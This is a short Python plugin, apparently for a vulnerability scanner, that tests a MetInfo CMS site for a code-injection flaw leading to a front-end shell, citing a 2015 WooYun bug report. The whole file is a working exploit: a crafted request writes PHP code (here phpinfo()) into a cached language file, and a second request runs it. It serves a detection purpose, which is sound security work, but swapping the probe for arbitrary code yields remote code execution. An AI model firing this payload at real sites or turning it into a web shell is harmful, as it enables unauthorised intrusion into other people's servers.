#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:range
#refer:http://wooyun.org/bugs/wooyun-2015-094886

def assign(service, arg):
    if service == "metinfo":
        return True, arg

def audit(arg):
    payload1 = '/admin/include/common.inc.php?met_admin_type_ok=1&langset=123&met_langadmin[123][]=12345&str=phpinfo%28%29%3B%3F%3E%2f%2f'
    payload2 = '/cache/langadmin_123.php'
    url1 = arg + payload1
    url2 = arg + payload2
    code1, head1, res1, errcode1, _ = curl.curl(url1)
    code2, head2, res2, errcode2, _ = curl.curl(url2)
    if code2 == '200' and code1 == '200':
        if res1.find('System') != -1:
            security_hole(url2 + 'MetInfo 前台getshell')
        else:
            security_warning(url2 + 'MetInfo 前台getshell(maybe)')

if __name__ == '__main__':
    from dummy import *
    audit(assign('metinfo', 'http://www.example.com/')[1])
